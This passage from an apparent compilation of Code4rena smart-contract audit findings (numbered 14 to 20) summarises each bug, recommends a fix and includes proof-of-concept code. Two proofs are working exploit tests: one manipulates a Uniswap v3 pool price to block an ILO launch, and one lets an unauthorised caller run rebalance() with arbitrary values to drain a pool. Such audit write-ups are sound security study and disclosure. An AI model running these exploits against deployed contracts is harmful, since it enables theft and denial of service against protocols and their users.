    IERC20(SALE_TOKEN).transfer(projectId, IERC20(SALE_TOKEN).balanceOf(address(this)));
}

```

</details>

## 14.[High] Adversary can prevent the launch of any ILO pool with enough raised capital at any moment by providing single-sided liquidity

### Price manipulation

- Summary: An attacker can prevent the launch of an ILO pool, even if it has met its fundraising goal, by manipulating the price of the associated Uniswap v3 pool. This can be done cheaply by adding single-sided liquidity in a way that disrupts the price check in the launch() function of the ILOManager contract. The price discrepancy caused by this manipulation can cause the token launch to fail, leading to a denial-of-service attack.

- Impact & Recommendation: This issue not only disrupts the token launch but also results in wasted gas fees for users and damages the project's reputation. To mitigate this, it is suggested to reserve a buffer amount of tokens in the ILO pool to handle price manipulation or use a wrapper token to maintain price stability.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-vultisig#h-03-Adversary-can-prevent-the-launch-of-any-ILO-pool-with-enough-raised-capital-at-any-moment-by-providing-single-sided-liquidity) & [Report](https://code4rena.com/reports/2024-06-vultisig)

<details><summary>POC</summary>

```solidity

function testManipulatePriceForLaunch() external {
    IILOManager.InitPoolParams memory params = _getInitPoolParams();
    _initPool(PROJECT_OWNER, params);
    assertEq(IUniswapV3Pool(projectId).token0(), USDC);
    assertEq(IUniswapV3Pool(projectId).token1(), SALE_TOKEN);
    vm.label(USDC, "USDC");
    vm.label(SALE_TOKEN, "SALE_TOKEN");
    vm.label(projectId, "UNI_V3_POOL");
    vm.label(address(this), "ATTACKER");
    unsuccessfulPriceManipulation();
    priceManipulationAttack();
    vm.warp(LAUNCH_START+1);
    vm.expectRevert(bytes("UV3P"));
    iloManager.launch(projectId);
}
function unsuccessfulPriceManipulation() internal {
    uint160 initialPrice = mockProject().initialPoolPriceX96;
    uint160 MIN_SQRT_RATIO = 4295128739 + 1;
    // Check price before attack
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);
    // Attack
    IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, "");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);
    // Mitigation
    IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, "");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);
}
function priceManipulationAttack() internal {
    uint160 initialPrice = mockProject().initialPoolPriceX96;
    uint160 MIN_SQRT_RATIO = 4295128739 + 1;
    // Check price before attack
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);
    // Attack -> Swap to manipulate price
    IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, "");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);
    // Attack -> Mint to prevent swapping back
    console.log("\n<<Minting Attack>>");
    deal(USDC, address(this), 1);
    int24 OUTSIDE_TICK = 0;
    IUniswapV3Pool(projectId).mint(address(this), OUTSIDE_TICK-10, OUTSIDE_TICK+10, 1, "");
    // Mitigation doesn't work now
    // You can uncomment the `expectRevert` and run the test with `-vvvv`
    // You'll see the log `ATTACKER::uniswapV3SwapCallback(0, 1, 0x)`, which means that it expects 1 wei of SALE_TOKEN
    // This is not possible as all SALE_TOKENs should be in the ILOPool at this moment
    console.log("\n<<Failed mitigation attempt>>");
    vm.expectRevert(bytes("IIA"));
    IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, "");
    // The price will remain the one set by the attacker
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);
}
function uniswapV3MintCallback(uint256, uint256, bytes memory) external {
    IERC20(USDC).transfer(projectId, IERC20(USDC).balanceOf(address(this)));
}
function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory) external {
    assertGe(amount0, 0);
    assertGe(amount1, 0);
    console.log("\nuniswapV3SwapCallback()");
    console.log("amount0 (USDC)      ", uint256(amount0));
    console.log("amount1 (SALE_TOKEN)", uint256(amount1));
}

```

</details>

## 15.[Medium] ExecuteSellUSDG() should also apply validateBufferAmount()

### Buffer of liquidity

- Summary: `ExecuteSellUSDG()` does not apply the `validateBufferAmount()` check, which is essential for maintaining the buffer of liquidity reserved for leveraged positions. The protocol allows setting `bufferAmounts` to ensure a certain amount of liquidity is always available. However, because `ExecuteSellUSDG()` does not perform this check, users could potentially bypass the buffer restriction by executing a `buyUSDG()` followed by a `sellUSDG()`, leading to a situation where `poolAmounts` fall below `bufferAmounts`.

- Impact & Recommendation: It is recommended to include the `validateBufferAmount()` check within `ExecuteSellUSDG()` to prevent this potential bypass and ensure that the buffer restrictions are consistently enforced.
  <br> 🐬: [Source](<https://code4rena.com/reports/2024-jul-gemnify-proleague#m-07-ExecuteSellUSDG()-should-also-apply-validateBufferAmount()>)& [Report](https://code4rena.com/reports/2024-jul-gemnify-proleague)

<details><summary>POC</summary>

```solidity

    // bufferAmounts allows specification of an amount to exclude from swaps
    // this can be used to ensure a certain amount of liquidity is available for leverage positions
    mapping (address => uint256) public override bufferAmounts;

```

</details>

## 16.[Medium] User could lose out on positive impact fee when decreasing position

### Positive impact fee

- Summary: In `PositionLogic.sol`, users could lose positive impact fees when decreasing a position if `cache.usdOut` was zero, even though `cache.usdOutAfterFee` was positive. This problem occurred because the token transfer only triggered when `cache.usdOut` was greater than zero, missing out on fees that were reflected in `cache.usdOutAfterFee`.

- Impact & recommendation: Modify the condition to check `cache.usdOutAfterFee > 0` for the transfer.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-jul-gemnify-proleague#m-10-User-could-lose-out-on-positive-impact-fee-when-decreasing-position)& [Report](https://code4rena.com/reports/2024-jul-gemnify-proleague)

<details><summary>POC</summary>

```solidity
        if (cache.usdOut > 0) {
            cache.amountOutAfterFees = GenericLogic.usdToTokenMin(params.collateralToken, cache.usdOutAfterFee);
            GenericLogic.transferOut(params.collateralToken, cache.amountOutAfterFees, params.receiver);
            return cache.amountOutAfterFees;
        }

```

</details>

## 17.[Medium] For extreme ratios, getRatiosFromPriceSwap will return data for which is impossible to converge into a reserve

### lookup table to fetch pre-calculated values

- Summary: `getRatiosFromPriceSwap` function in the Basin protocol uses a lookup table to fetch pre-calculated values for reserves calculations. The issue arises when dealing with extreme price ratios (e.g., 1:4.6), where the difference between the high and low prices returned by the function causes incorrect reserve calculations. This leads to the reserves moving away from the target price and eventually returning a zero value.

- Impact & Recommendation: Improve the step size in the `getRatiosFromPriceSwap` function to ensure the calculations stay within a reasonable range and prevent the function from skipping over the correct reserves.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-basin#m-01-For-extreme-ratios,-getRatiosFromPriceSwap-will-return-data-for-which-is-impossible-to-converge-into-a-reserve)

<details><summary>POC</summary>

```solidity

        function test_calcReserveAtRatioSwapSkipTarget() public view {
            uint256[] memory reserves = new uint256[](2);
            reserves[0] = 1e18;
            reserves[1] = 1e18;
            uint256[] memory ratios = new uint256[](2);
            ratios[0] = 4202;
            ratios[1] = 19811;
            // 4202 * 1e6 / 19811  = 212104 = 0.212 / 1  = 1 : 4.6
            //                                0.04  / 1  = 1 : 25
            uint256 reserve1 = _f.calcReserveAtRatioSwap(reserves, 1, ratios, data);
            //console.log("Reserves 1 :", reserve1);
        }

```

</details>

## 18.[Medium] The streak bonus is calculated incorrectly

### Bonus Calculation

- Summary: In ULTI.sol, the ULTI protocol rewards users with a streak bonus for depositing every cycle, which multiplies their minted ULTI when depositing ETH. This bonus is applicable when the amount of ULTI minted in the current cycle exceeds that of the previous cycle. The flaw arises because the variable ultiMintedPreviousCycle, used to compare the current cycle's minted ULTI against previous cycles, is not updated during the loop. This leads to incorrect comparisons, where the same amount is compared against prior cycles, resulting in inflated streakCount values.

- Impact & Recommendation: The recommended fix involves updating ultiMintedPreviousCycle within the loop to ensure accurate comparisons, and this has been successfully implemented.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-09-ulti-zenith#m-06-The-streak-bonus-is-calculated-incorrectly) & [Report](https://code4rena.com/reports/2024-09-ulti-zenith)

<details><summary>POC</summary>

```solidity

    function _calculateStreakBonus(address user, uint256 ultiMinted, uint256 currentCycle) internal view returns (uint256) {
        if (currentCycle < 3) return 0;
>>      uint256 ultiMintedPreviousCycle = ultiMintedForCycle[currentCycle - 1][user];
        if(ultiMintedPreviousCycle == 0) return 0;
        // Cap the streak count at 10 cycles
        uint256 streakCount = 0;
        for (uint256 i = 1; i <= STREAK_BONUS_CYCLE_CAP && currentCycle > i; i++) {
            if (currentCycle <= i) break;
            uint256 ultiMintedIMinus1CycleAgo = ultiMintedForCycle[currentCycle - i - 1][user];
>>          if (ultiMintedPreviousCycle >= ultiMintedIMinus1CycleAgo) {
                streakCount++;
            } else {
                break;
            }
        }


        for (uint256 i = 1; i <= STREAK_BONUS_CYCLE_CAP && currentCycle > i; i++) {
-           if (currentCycle <= i) break;
            uint256 ultiMintedIMinus1CycleAgo = ultiMintedForCycle[currentCycle - i - 1][user];
+           if (ultiMintedPreviousCycle >= ultiMintedIMinus1CycleAgo && ultiMintedPreviousCycle !=0) {
                streakCount++;
            } else {
                break;
            }
+           ultiMintedPreviousCycle = ultiMintedForCycle[currentCycle - i - 1][user];
        }

```

</details>

## 19.[High] Anyone can call LamboRebalanceOnUniwap.sol::rebalance() function with any arbitrary value, leading to rebalancing goal i.e. (1:1 peg) unsuccessful.

### Rebalance 1:1 peg

- Summary: The rebalance() function in the LamboRebalanceOnUniwap.sol contract can be called by anyone with arbitrary values for its parameters, such as directionMask, amountIn, and amountOut. Since there is no validation to check whether these parameters are legitimate or not, this leads to two potential problems. Flashloans may be executed with incorrect amounts, causing the pool to become unbalanced instead of achieving the intended 1:1 peg.
  If the wrong directionMask is used (other than 0 or 1<<255), the function could revert or produce incorrect results.

- Impact & Recommendation: To prevent this issue, the rebalance() function should validate that the parameters passed (such as directionMask, amountIn, and amountOut) are legitimate and meet the necessary conditions, such as those required for flashloan transactions. This validation will prevent unauthorized or incorrect rebalancing operations and ensure the pool's balance remains accurate.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-12-lambowin#h-04-anyone-can-call-lamborebalanceonuniwapsolrebalance-function-with-any-arbitrary-value-leading-to-rebalancing-goal-ie-11-peg-unsuccessful) & [Report](https://code4rena.com/reports/2024-12-lambowin)

<details><summary>POC</summary>

```solidity
function test_any_caller() public {
    uint256 amount = 422 ether;
    uint256 _v3pool = uint256(uint160(uniswapPool)) | (_ONE_FOR_ZERO_MASK);
    uint256[] memory pools = new uint256[](1);
    pools[0] = _v3pool;

    uint256 amountOut0 = IDexRouter(OKXRouter).uniswapV3SwapTo{value: amount}(
        uint256(uint160(multiSign)),
        amount,
        0,
        pools
    );

    console.log("user amountOut0", amountOut0);


    (bool result, uint256 directionMask, uint256 amountIn, uint256 amountOut) = lamboRebalance.previewRebalance();
    require(result, "Rebalance not profitable");

    uint256 before_uniswapPoolWETHBalance = IERC20(WETH).balanceOf(uniswapPool);
    uint256 before_uniswapPoolVETHBalance = IERC20(VETH).balanceOf(uniswapPool);

    uint snapshot = vm.snapshot();

    lamboRebalance.rebalance(directionMask, amountIn, amountOut);

    uint256 initialBalance = IERC20(WETH).balanceOf(address(this));
    lamboRebalance.extractProfit(address(this), WETH);
    uint256 finalBalance = IERC20(WETH).balanceOf(address(this));
    require(finalBalance > initialBalance, "Profit must be greater than 0");

    console.log("profit :", finalBalance - initialBalance);

    uint256 after_uniswapPoolWETHBalance = IERC20(WETH).balanceOf(uniswapPool);
    uint256 after_uniswapPoolVETHBalance = IERC20(VETH).balanceOf(uniswapPool);


    // profit : 2946145314758099343
    // before_uniswapPoolWETHBalance:  872000000000000000000
    // before_uniswapPoolVETHBalance:  33469956719686937289
    // after_uniswapPoolWETHBalance:  449788833045085369301
    // after_uniswapPoolVETHBalance:  452734978359843468645

    console.log("before_uniswapPoolWETHBalance: ", before_uniswapPoolWETHBalance);
    console.log("before_uniswapPoolVETHBalance: ", before_uniswapPoolVETHBalance);
    console.log("after_uniswapPoolWETHBalance: ", after_uniswapPoolWETHBalance);
    console.log("after_uniswapPoolVETHBalance: ", after_uniswapPoolVETHBalance);

    vm.revertTo(snapshot);

    // creating a non-authorised address.
    uint256 signerPrivateKey = 0xabc123;
    address signer = vm.addr(signerPrivateKey);

    deal(WETH, signer, amountIn + 100 ether);
    deal(VETH, signer, amountOut + 100 ether);

    vm.startPrank(signer);
    lamboRebalance.rebalance(directionMask, amountIn + 100 ether, amountOut + 100 ether);
    vm.stopPrank();

    initialBalance = IERC20(WETH).balanceOf(address(this));
    lamboRebalance.extractProfit(address(this), WETH);
    finalBalance = IERC20(WETH).balanceOf(address(this));
    require(finalBalance > initialBalance, "Profit must be greater than 0");

    console.log("profit :", finalBalance - initialBalance);

    after_uniswapPoolWETHBalance = IERC20(WETH).balanceOf(uniswapPool);
    after_uniswapPoolVETHBalance = IERC20(VETH).balanceOf(uniswapPool);

    // profit : 2569562398577461702
    // before_uniswapPoolWETHBalance:2  872000000000000000000
    // before_uniswapPoolVETHBalance:2  33469956719686937289
    // after_uniswapPoolWETHBalance:2  350165415961266006942
    // after_uniswapPoolVETHBalance:2  552734978359843468645

    console.log("before_uniswapPoolWETHBalance:2 ", before_uniswapPoolWETHBalance);
    console.log("before_uniswapPoolVETHBalance:2 ", before_uniswapPoolVETHBalance);
    console.log("after_uniswapPoolWETHBalance:2 ", after_uniswapPoolWETHBalance);
    console.log("after_uniswapPoolVETHBalance:2 ", after_uniswapPoolVETHBalance);


    require(
        ((before_uniswapPoolWETHBalance + before_uniswapPoolVETHBalance) -
            (after_uniswapPoolWETHBalance + after_uniswapPoolVETHBalance) ==
            (finalBalance - initialBalance)),
        "Rebalance Profit comes from pool's rebalance"
    );

}

```

</details>

## 20.[High] Protocol allows creating broken tri-crypto CPMM pools

### Tri-crypto CPMM pools

- Summary: The protocol allows the creation of constant product market maker (CPMM) pools with more than two tokens, even though the implemented Uniswap-style formula is only valid for two-token pools. This flaw enables the creation of broken tri-crypto pools where liquidity can be added, and swaps can be performed, but the invariant does not hold correctly, leading to potential arbitrage opportunities and financial losses.

- Impact & Recommendation: The issue arises due to a missing check during pool creation, and it can be bypassed by not specifying a slippage tolerance. To fix this, an explicit validation should be added to prevent CPMM pools from having more than two tokens.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-11-mantra-dex#h-01-protocol-allows-creating-broken-tri-crypto-cpmm-pools) & [Report](https://code4rena.com/reports/2024-11-mantra-dex)

<details><summary>POC</summary>

```rust

fn print_diff(init_bal: [Uint128; 4], final_bal: [Uint128; 4]) -> [i128; 4] {
    let diffs = [
        final_bal[0].u128() as i128 - init_bal[0].u128() as i128,
        final_bal[1].u128() as i128 - init_bal[1].u128() as i128,
        final_bal[2].u128() as i128 - init_bal[2].u128() as i128,
        final_bal[3].u128() as i128 - init_bal[3].u128() as i128,
    ];

    println!("==Balance deltas==");
    if diffs[0] != 0 {
        println!("uwhale delta: {}", diffs[0]);
    }
    if diffs[1] != 0 {
        println!("uluna delta : {}", diffs[1]);
    }
    if diffs[2] != 0 {
        println!("uusd delta  : {}", diffs[2]);
    }
    if diffs[3] != 0 {
        println!("lp delta    : {}", diffs[3]);
    }
    println!("==Balance deltas==\n");

    diffs
}

fn calc_state(suite: &mut TestingSuite, creator: &str) -> [Uint128; 4] {
    let uwhale_balance = RefCell::new(Uint128::zero());
    let uluna_balance = RefCell::new(Uint128::zero());
    let uusd_balance = RefCell::new(Uint128::zero());
    let lp_shares = RefCell::new(Uint128::zero());

    suite.query_balance(&creator.to_string(), "uwhale".to_string(), |result| {
        *uwhale_balance.borrow_mut() = result.unwrap().amount;
    });

    suite.query_balance(&creator.to_string(), "uluna".to_string(), |result| {
        *uluna_balance.borrow_mut() = result.unwrap().amount;
    });

    suite.query_balance(&creator.to_string(), "uusd".to_string(), |result| {
        *uusd_balance.borrow_mut() = result.unwrap().amount;
    });

    suite.query_all_balances(&creator.to_string(), |balances| {
        for coin in balances.unwrap().iter() {
            if coin.denom.contains("o.whale.uluna") {
                *lp_shares.borrow_mut() = coin.amount;
            }
        }
    });

    let uwhale = *uwhale_balance.borrow();
    let uluna = *uluna_balance.borrow();
    let uusd = *uusd_balance.borrow();
    let lp = *lp_shares.borrow();
    [uwhale, uluna, uusd, lp]
}

```

</details>
